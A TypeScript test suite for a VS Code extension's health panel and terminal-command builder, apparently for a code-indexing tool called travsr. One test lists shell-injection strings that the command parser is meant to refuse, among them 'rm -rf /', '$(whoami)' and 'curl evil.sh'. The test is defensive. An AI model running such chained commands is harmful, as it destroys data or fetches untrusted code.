import * as assert from "assert";
import { buildStatsHtml, computeVerdict, UNKNOWN_INDEX } from "../../webviews";
import type { Diagnostic, HealthData, IndexHealth, StatsView } from "../../webviews";
import { EMPTY_HEALTH } from "../../webviews";
import { parseIndexHealth } from "../../commands";
import {
  detectShellKind,
  formatCommandLine,
  parseTravsrInvocation,
  quoteForShell,
} from "../../terminal";

const STATS: StatsView = {
  nodes: "12,438",
  edges: "41,902",
  schemaVersion: "3",
  dbSize: "41.2 MB",
  lastIndexed: "4m ago",
};

const FRESH: IndexHealth = {
  isStale: false,
  behindBy: 0,
  indexedCommit: "a1b2c3d",
  headCommit: "a1b2c3d",
  phaseA: "done",
  workingTreeDirty: false,
  available: true,
};

const RUNNING: HealthData = { ...EMPTY_HEALTH, daemonRunning: true, mcpConnected: true };
const STOPPED: HealthData = { ...EMPTY_HEALTH, daemonRunning: false, mcpConnected: false };

/** A gather that succeeded, with one problem in each section, so a render can
 *  be checked against every branch that has something to say. */
const FULL: HealthData = {
  daemonRunning: false,
  daemonDetail: "not running",
  mcpConnected: true,
  daemonPid: "24188",
  daemonStopped: "11:38:50",
  lastEditor: "vscode-10580 detached 11:38:26",
  binaryVersion: "1.0.0",
  logFileName: "daemon.log.2026-09-02",
  logFileSize: "4 KB",
  commitHook: false,
  sidecars: [
    { name: "embed", state: "not installed, semantic search off", ok: false, action: "installEmbed" },
    { name: "rerank", state: "v0.4.1, ready", ok: true, action: "restartEmbed" },
  ],
  agents: [
    { name: "Claude Desktop", registered: true, detail: "registered" },
    { name: "Cursor (workspace)", registered: false, detail: "not registered" },
    { name: "Continue", registered: false, detail: "config file not found" },
  ],
  repos: [
    { name: "menuservice", path: "c:/r/menuservice", exists: true },
    { name: "logrot-testrepo", path: "c:/r/logrot", exists: false },
  ],
  activeRepo: "menuservice",
  languages: [
    { language: "Java", analysis: "structural only", full: false, statusLine: "partial", flagged: true, fix: "semantic" },
    { language: "XML", analysis: "full", full: true, statusLine: "installed and enabled", flagged: false, fix: "none" },
    { language: "Go", analysis: "structural only", full: false, statusLine: "partial (run: travsr lang install go for full analysis)", flagged: false, fix: "install" },
  ],
  integrity: {
    healthy: false,
    ghostCount: 3,
    ghostSample: ["crates/travsr-core/src/legacy_walker.rs"],
    lexicalOk: true,
    dbSize: "28.7 MB",
    logSize: "4 KB",
    logFiles: 1,
  },
};

const STALE: IndexHealth = { ...FRESH, isStale: true, behindBy: 3, headCommit: "c40de81" };

const WARN: Diagnostic = {
  severity: "warn",
  title: "'java' analysis ran but found no symbols",
  hint: "'java' analysis ran but found no symbols, re-run `travsr init --semantic --force`",
  command: "travsr init --semantic --force",
};

suite("index status parsing", () => {
  test("an empty reply is unavailable, not fresh", () => {
    // An older binary does not serve get_index_status, and the client answers
    // "" for an unknown tool. Reading that as "not stale" would be the panel
    // asserting something it was never told.
    const h = parseIndexHealth("");
    assert.strictEqual(h.available, false);
    assert.strictEqual(h.isStale, null);
  });

  test("malformed JSON is unavailable", () => {
    assert.strictEqual(parseIndexHealth("<travsr-data>{nope</travsr-data>").available, false);
  });

  test("the envelope is stripped and the fields land", () => {
    const raw =
      "<travsr-data>" +
      JSON.stringify({
        indexed_commit: "a1b2c3d",
        head_commit: "c40de81",
        staleness: { behind_by: 3, is_stale: true, working_tree_dirty: true },
        phase_a: { state: "done" },
      }) +
      "</travsr-data>";
    const h = parseIndexHealth(raw);
    assert.strictEqual(h.available, true);
    assert.strictEqual(h.isStale, true);
    assert.strictEqual(h.behindBy, 3);
    assert.strictEqual(h.indexedCommit, "a1b2c3d");
    assert.strictEqual(h.headCommit, "c40de81");
    assert.strictEqual(h.workingTreeDirty, true);
  });

  test("a null is_stale stays null rather than collapsing to false", () => {
    const raw =
      "<travsr-data>" +
      JSON.stringify({ staleness: { is_stale: null, behind_by: null } }) +
      "</travsr-data>";
    assert.strictEqual(parseIndexHealth(raw).isStale, null);
  });
});

suite("verdict", () => {
  test("a stopped daemon outranks everything else", () => {
    // Nothing below the banner is live in this state, so it has to lead even
    // when there are analyzer warnings to report as well.
    const v = computeVerdict(false, false, STALE, [WARN], true);
    assert.strictEqual(v.verdict, "offline");
    assert.strictEqual(v.headline, "Not answering");
    assert.strictEqual(v.action?.message, "startDaemon");
    assert.ok(/read from the graph on disk/.test(v.detail));
  });

  test("a stopped daemon is reported even while queries still answer", () => {
    // The regression this pins: the page read the MCP client's connection
    // state as the daemon's state. The extension spawns its own
    // `travsr mcp --stdio` child, which opens the database directly and keeps
    // answering with no daemon anywhere, so the page said "running" beside a
    // terminal saying `daemon: not running`.
    const v = computeVerdict(true, false, FRESH, [], true);
    assert.strictEqual(v.verdict, "degraded");
    assert.strictEqual(v.headline, "Not watching");
    assert.strictEqual(v.action?.message, "startDaemon");
    assert.ok(/will not refresh/.test(v.detail), v.detail);
  });

  test("no graph is its own state, not an error", () => {
    const v = computeVerdict(true, true, UNKNOWN_INDEX, [], false);
    assert.strictEqual(v.verdict, "unindexed");
    assert.strictEqual(v.action?.message, "initRepo");
  });

  test("staleness outranks analyzer warnings, and names both commits", () => {
    const v = computeVerdict(true, true, STALE, [WARN], true);
    assert.strictEqual(v.verdict, "stale");
    assert.strictEqual(v.action?.message, "reindex");
    assert.ok(v.detail.includes("a1b2c3d"), v.detail);
    assert.ok(v.detail.includes("3 commits"), v.detail);
  });

  test("warnings alone read as degraded, and are counted", () => {
    const v = computeVerdict(true, true, FRESH, [WARN, { ...WARN, severity: "error" }], true);
    assert.strictEqual(v.verdict, "degraded");
    assert.ok(v.detail.includes("1 error"), v.detail);
    assert.ok(v.detail.includes("1 warning"), v.detail);
    assert.strictEqual(v.action, undefined);
  });

  test("clean is healthy", () => {
    const v = computeVerdict(true, true, FRESH, [], true);
    assert.strictEqual(v.verdict, "healthy");
    assert.strictEqual(v.headline, "Healthy");
  });

  test("every verdict carries a word, so the banner colour is never the only signal", () => {
    const cases: Array<[boolean, IndexHealth, Diagnostic[], boolean]> = [
      [false, FRESH, [], true],
      [true, UNKNOWN_INDEX, [], false],
      [true, STALE, [], true],
      [true, FRESH, [WARN], true],
      [true, FRESH, [], true],
    ];
    for (const [running, idx, ds, has] of cases) {
      const v = computeVerdict(running, running, idx, ds, has);
      assert.ok(v.headline.length > 0, JSON.stringify(v));
      assert.ok(v.detail.length > 0, JSON.stringify(v));
    }
  });
});

suite("health panel rendering", () => {
  test("the stale tile says stale rather than only turning amber", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, STALE, RUNNING);
    assert.ok(html.includes('class="card warn"'), "tile carries the state class");
    assert.ok(html.includes(">stale<"), "and the word beside the value");
  });

  test("a fresh index leaves the tiles unmarked", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(!html.includes('class="card warn"'));
  });

  test("the diagnostic is not printed twice", () => {
    // `title` is `hint` with the trailing "run `cmd`" clause removed, and the
    // card used to render both, so the heading read as a sentence cut off
    // mid-thought and the body repeated it in full.
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, RUNNING);
    const first = html.indexOf("analysis ran but found no symbols");
    const second = html.indexOf("analysis ran but found no symbols", first + 1);
    assert.strictEqual(second, -1, "the sentence appears once");
  });

  test("a fix offers Run and Copy, and the command text never reaches the click handler", () => {
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(html.includes("runFix(this, 0)"), "Run posts an index");
    assert.ok(html.includes("copyFix(this, 0)"), "Copy posts an index");
    assert.ok(
      !html.includes("runFix(this, 'travsr"),
      "no command text is inlined into an onclick"
    );
  });

  test("an unavailable index status says so instead of rendering gaps as answers", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, RUNNING);
    assert.ok(html.includes("not reported by this binary"));
  });

  test("a missing index status blames the right thing", () => {
    // An empty reply is not evidence about the binary's age when Travsr is not
    // answering, or when the daemon is stopped. Saying "not reported by this
    // binary" there sends the reader to check the wrong thing.
    const offline = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, STOPPED);
    assert.ok(offline.includes("Travsr is not answering"), offline.slice(0, 0) || "offline reason");
    const noDaemon = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, {
      ...RUNNING,
      daemonRunning: false,
    });
    assert.ok(noDaemon.includes("while the daemon is stopped"), "stopped-daemon reason");
    assert.ok(!noDaemon.includes("not reported by this binary"), "and not the binary's age");
  });

  test("the header carries a timestamp the document can count from", () => {
    // "checked just now" was a literal, so it never changed and a Refresh on an
    // otherwise unchanged page produced no visible result at all.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(/data-at="\d{13}"/.test(html), "a real epoch timestamp is rendered");
    assert.ok(html.includes("tickChecked"), "and the document ticks it");
  });

  test("being unable to query is stated, not implied by the numbers being old", () => {
    // STOPPED is both: no daemon and no answers. The banner has to say the
    // numbers came off disk rather than leaving the reader to infer it.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, STOPPED);
    assert.ok(html.includes("Not answering"));
    assert.ok(html.includes("read from the graph on disk"));
    assert.ok(html.includes("startDaemon"));
  });

  test("every section renders, and each is collapsible", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL, "travsr", "c:/r");
    for (const title of [
      "Daemon",
      "Index freshness",
      "Sidecars",
      "Storage and integrity",
      "Languages",
      "Agent connections",
      "Repositories",
    ]) {
      assert.ok(html.includes(`>${title}</span>`), `${title} is missing`);
    }
    // Seven sections plus Recent activity and the log keep their own <details>.
    assert.ok((html.match(/<details class="hsec" open>/g) ?? []).length === 7);
  });

  test("a section whose data could not be read says so, rather than reading as clean", () => {
    // EMPTY_HEALTH is what a failed gather looks like. Rendering that as empty
    // rows would be the page claiming there is nothing wrong.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(html.includes("Could not read the sidecar list."));
    assert.ok(html.includes("Could not read the language list."));
    assert.ok(html.includes("Could not read the repository registry."));
  });

  test("real section data lands in the rows", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("not installed, semantic search off"), "sidecar state");
    assert.ok(html.includes("structural only"), "language analysis");
    assert.ok(html.includes("config file not found"), "agent detail");
    assert.ok(html.includes("logrot-testrepo"), "repo row");
    assert.ok(html.includes("ghost path"), "integrity chip");
  });

  test("the commit hook is reported only when it was actually checked", () => {
    const unchecked = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(!unchecked.includes("Commit hook"), "null means not checked, so it is not claimed");
    const checked = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(checked.includes("Commit hook"));
    assert.ok(checked.includes("so commits do not refresh"));
  });

  test("the log row points at the reader on this page, not at the raw file", () => {
    // Opening the file in an editor was both redundant, since the Daemon log
    // section reads it with filters and a rotated-file picker, and broken: the
    // logs live in .travsr, not .travsr/logs.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("showLog()"), "the button scrolls to the log section");
    assert.ok(html.includes('id="daemonLogSection"'), "and that section is anchored");
    assert.ok(!html.includes("openLog"), "no message asks the extension to open a file");
  });

  test("the daemon section states the daemon and the queries separately", () => {
    // FULL is the real shape of the reported bug: daemon down, queries fine.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("not running"), "the daemon's own word");
    assert.ok(html.includes("answering from the graph on disk"), "queries are separate");
    assert.ok(html.includes("commits and saves will not refresh"), "and the consequence is named");
    assert.ok(!html.includes(">running</b>"), "it must not claim the daemon is up");
  });

  test("a language the CLI calls active is still flagged when a warning names it", () => {
    // `lang list` reports java as installed and enabled while `travsr status`
    // warns it resolved nothing. The table used to show a tick beside a card
    // saying the opposite.
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("see the warning below"), "the row points at the card");
    assert.ok(!html.includes("<td>resolved</td>"), "no invented symbol count");
  });

  test("the semantic tile counts languages, it does not invent a symbol total", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("1 of 3"), "a count of languages");
    assert.ok(!html.includes("0 symbols"), "never a fabricated total");
  });

  test("a language offers the fix its own status line names", () => {
    // Go is partial with no analyzer installed, so the CLI says the fix is
    // `travsr lang install go`. Offering a semantic re-index there runs the
    // wrong command and changes nothing.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("Install analyzer"), "the install fix is offered");
    assert.ok(html.includes("Re-run semantic"), "and the re-index fix where that is the fix");
    assert.ok(html.includes("fixLang(this, 2)"), "each row posts its own index");
    assert.ok(!html.includes("fixLang(this, 'go')"), "never the language name itself");
  });

  test("every button on the page posts a message the panel handles", () => {
    // The Remove and Prune stale buttons were rendered here but their handlers
    // lived only in the Repos panel, so clicking them did nothing at all. This
    // pins the set of messages this page can emit against the set the
    // controller implements, so a new button cannot ship dead.
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, STALE, FULL);
    const HANDLED = new Set([
      "refresh", "startDaemon", "restartDaemon", "reindex", "fullRebuild",
      "reindexSemantic", "installHook", "installEmbed", "restartEmbed",
      "runFsck", "compact", "registerMcp", "prune", "remove", "fixLang",
      "runFix", "copyFix", "openFile", "setLogLines", "setLogFile", "setLogAuto",
      "initRepo", "detectLangs",
    ]);
    const posted = new Set<string>();
    for (const m of html.matchAll(/command:\s*'([a-zA-Z]+)'/g)) posted.add(m[1]);
    for (const m of html.matchAll(/panelAction\(this,\s*'([a-zA-Z]+)'\)/g)) posted.add(m[1]);
    for (const m of html.matchAll(/verdictAction\(this,\s*'([a-zA-Z]+)'\)/g)) posted.add(m[1]);
    assert.ok(posted.size > 5, `expected several messages, saw ${[...posted]}`);
    for (const p of posted) {
      assert.ok(HANDLED.has(p), `${p} is posted by the page but not handled`);
    }
  });

  test("the logs row offers no action, because pruning them is the daemon's job", () => {
    // This button was wired to `repos --prune`, so a click beside Logs would
    // have pruned the repository registry instead.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("pruned by the daemon"), "the row says who prunes");
    assert.ok(!html.includes("pruneLogs"), "and offers no button of its own");
  });

  test("the repository list is capped, with the live ones first", () => {
    // A machine that has run the test suite accumulates a registry entry per
    // temp repo. This reached seventy rows of .tmpXXXXXX and buried the real
    // repositories.
    const many: HealthData = {
      ...FULL,
      repos: [
        ...Array.from({ length: 68 }, (_, i) => ({
          name: `.tmp${i}`,
          path: `c:/t/${i}`,
          exists: false,
        })),
        { name: "travsr", path: "c:/r/travsr", exists: true },
        { name: "menuservice", path: "c:/r/menu", exists: true },
      ],
    };
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, many);
    assert.ok(html.includes("travsr"), "a live repo is shown");
    assert.ok(html.includes("and 62 more"), "the rest are counted, not listed");
    assert.ok(html.includes("Prune stale (68)"), "and the bulk fix is offered");
    assert.ok((html.match(/removeRepoRow\(/g) ?? []).length <= 8, "rows are capped");
  });

  test("no section signals its state by colour alone", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, STALE, FULL);
    // Each chip tone carries a word beside it.
    for (const word of ["not running", "stale", "missing", "partial"]) {
      assert.ok(html.includes(word), `${word} is not stated`);
    }
  });
});

suite("terminal command building", () => {
  test("only a plain travsr call is accepted", () => {
    assert.deepStrictEqual(parseTravsrInvocation("travsr init --semantic --force"), [
      "init",
      "--semantic",
      "--force",
    ]);
    assert.deepStrictEqual(parseTravsrInvocation("travsr lang install java"), [
      "lang",
      "install",
      "java",
    ]);
  });

  test("anything a shell would interpret is refused rather than escaped", () => {
    for (const bad of [
      "travsr init; rm -rf /",
      "travsr $(whoami)",
      "travsr init && curl evil.sh",
      "npm i -g travsr",
      'travsr init "a b"',
      "travsr init `id`",
      "travsr init | tee out",
    ]) {
      assert.strictEqual(parseTravsrInvocation(bad), null, bad);
    }
  });

  test("the shell is classified from its basename, with a platform fallback", () => {
    assert.strictEqual(detectShellKind("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), "powershell");
    assert.strictEqual(detectShellKind("/usr/bin/pwsh"), "powershell");
    assert.strictEqual(detectShellKind("C:\\Windows\\System32\\cmd.exe"), "cmd");
    assert.strictEqual(detectShellKind("/bin/zsh"), "posix");
    assert.strictEqual(detectShellKind("C:\\Program Files\\Git\\bin\\bash.exe"), "posix");
    assert.strictEqual(detectShellKind(undefined, "win32"), "powershell");
    assert.strictEqual(detectShellKind(undefined, "linux"), "posix");
  });

  test("a safe token is left alone, and a space is quoted per shell", () => {
    assert.strictEqual(quoteForShell("init", "posix"), "init");
    assert.strictEqual(quoteForShell("a b", "posix"), "'a b'");
    assert.strictEqual(quoteForShell("a b", "powershell"), "'a b'");
    assert.strictEqual(quoteForShell("a b", "cmd"), '"a b"');
    assert.strictEqual(quoteForShell("it's", "posix"), `'it'\\''s'`);
    assert.strictEqual(quoteForShell("it's", "powershell"), "'it''s'");
  });

  test("PowerShell gets the call operator only when the binary is quoted", () => {
    assert.strictEqual(
      formatCommandLine("C:\\Program Files\\t\\travsr.exe", ["daemon", "start"], "powershell"),
      "& 'C:\\Program Files\\t\\travsr.exe' daemon start"
    );
    assert.strictEqual(
      formatCommandLine("C:\\tools\\travsr.exe", ["daemon", "start"], "powershell"),
      "C:\\tools\\travsr.exe daemon start"
    );
    assert.strictEqual(
      formatCommandLine("/usr/bin/travsr", ["init"], "posix"),
      "/usr/bin/travsr init"
    );
  });
});
